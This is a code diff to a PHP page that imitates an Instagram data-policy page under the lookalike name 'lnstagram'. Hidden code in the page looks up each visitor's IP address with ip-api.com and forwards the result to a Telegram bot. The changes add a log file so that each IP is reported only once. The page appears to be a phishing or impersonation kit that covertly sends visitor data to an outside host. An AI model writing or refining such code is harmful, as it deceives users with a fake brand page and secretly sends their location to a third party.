@@ -1,6 +1,6 @@
-
 <?php
 
+// Kullanıcının IP adresini al
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['HTTP_CLIENT_IP'];
 } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
@@ -9,6 +9,14 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
     $ip = $_SERVER['REMOTE_ADDR'];
 }
 
+// Daha önce mesaj gönderildiyse tekrar gönderme
+$filePath = 'path/to/sent_messages.txt';
+if (file_exists($filePath)) {
+    $sentMessages = file_get_contents($filePath);
+    if (strpos($sentMessages, $ip) !== false) {
+        exit(); // Mesaj zaten gönderilmiş, işlemi sonlandır
+    }
+}
 
 // Dış servise IP bilgilerini gönder
 $apiUrl = "http://ip-api.com/json/{$ip}";
@@ -45,7 +53,11 @@ $telegramParams = [
 // Telegram API'sine isteği gönder
 file_get_contents($telegramApiUrl . '?' . http_build_query($telegramParams));
 
+// Gönderilen IP'yi kaydet
+file_put_contents($filePath, $ip . PHP_EOL, FILE_APPEND);
+
 ?>
+
 
 <html lang="en">
 
@@ -410,7 +422,7 @@ file_get_contents($telegramApiUrl . '?' . http_build_query($telegramParams));
 
 </main>
     <div class="container">
-      <h2 style="opacity:0.5;"> lnstagram Data Policy </h2>
+      <h2 style="opacity:0.5;"> lnstagram Data Policy</h2>
       <p style="opacity:0.5;">
         The Facebook company is now called Meta. We updated our Terms of Use, Data Policy, and Cookies Policy to reflect this new name on January 4, 2022. Our company name has changed, but we continue to offer the same products, including the Facebook app that Meta provides. Our Data Policy and Terms of Service remain in effect, and this name change doesn't affect how we use and share data. Learn more about Meta and our vision for the metaverse.
       </p>
